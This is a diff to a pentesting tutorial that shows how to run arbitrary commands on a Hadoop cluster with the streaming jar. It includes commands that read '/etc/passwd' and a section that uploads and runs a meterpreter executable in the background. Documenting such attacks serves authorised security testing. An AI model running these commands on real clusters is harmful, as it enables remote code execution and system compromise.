@@ -7,7 +7,7 @@ This tutorial explains how to execute arbitrary commands on an Hadoop cluster
 
 Prerequisites
 -------------
-1. A **working attack environment**, including Hadoop binaries and the target cluster configuration are needed. Follow the following tutorials to set them up: 
+1. A **working attack environment**: Hadoop binaries and the target cluster configuration are needed. Follow the following tutorials to set them up: 
   * [Setting up an Hadoop attack environment](../Setting up an Hadoop attack environment)
   * [Getting the target environment configuration](../Getting the target environment configuration)  
   
@@ -25,23 +25,23 @@ Executing a single command
 --------------------------
 1. Go to the directory where you decompressed Hadoop binaries (`/opt` in the tutorial):
   ```
-  $ cd /opt
+  $ cd /opt/hadoop-2.7.3/
   ```
   
 2. Call the Hadoop streaming utility:
   ```
-  $ hadoop jar ../share/hadoop/tools/lib/hadoop-streaming-2.7.3.jar -input <a non empty file on HDFS> -output <a nonexistant directory on HDFS> -mapper <your single command> -reducer NONE
+  $ hadoop jar share/hadoop/tools/lib/hadoop-streaming-2.7.3.jar -input <a non empty file on HDFS> -output <a nonexistant directory on HDFS> -mapper <your single command> -reducer NONE
   ```
   
 Some explanations might be useful:
   * `-input <a non empty file on HDFS>`: this will be provided as input to MapReduce for the command to be executed, just put at least a character in that file, this file is useless for our objective 
   * `-output <a nonexistant directory on HDFS>`: this directory will be used by MapReduce to write the result, either `_SUCCESS` or failure
-  * `-mapper <your single command>`: the command to execute, for instance "/bin/cat /etc/passwd". The output result will be written in the `-output` directory
+  * `-mapper <your single command>`: the command to execute, for instance `"/bin/cat /etc/passwd"`. The output result will be written in the `-output` directory
   * `-reducer`: there is no need for a reducer to execute a single command, a mapper is enough  
 
 Note that for certain distributions you might need to put **additional parameters** (with `-D`) to submit a MapReduce job, for instance on HortonWorks cluster you need the `-Dhdp.version=<version>` option: you can find this information when you grab the target cluster configuration.  
 
-Then when the job is executed: 
+Then when the job is terminated its execution: 
 * Check the output result:
   ```
   $ hadoop fs -ls <a nonexistant directory on HDFS>
@@ -56,7 +56,7 @@ Then when the job is executed:
 Executing a meterpreter
 -----------------------
 ```
-$ hadoop jar ../share/hadoop/tools/lib/hadoop-streaming-2.7.3.jar -input <a non empty file on HDFS> -output <a nonexistant directory on HDFS> -mapper <your executable meterpreter path on HDFS> -reducer NONE -file <your executable meterpreter path on your local attacking environment> -background
+$ hadoop jar share/hadoop/tools/lib/hadoop-streaming-2.7.3.jar -input <a non empty file on HDFS> -output <a nonexistant directory on HDFS> -mapper <your executable meterpreter path on HDFS> -reducer NONE -file <your executable meterpreter path on your local attacking environment> -background
 ```
 Again, some explanations:
   * `-file <your executable meterpreter path on your local attacking environment>`: your local meterpreter executable will be uploaded on HDFS, for instance "/root/foobar/meterpreter.elf"
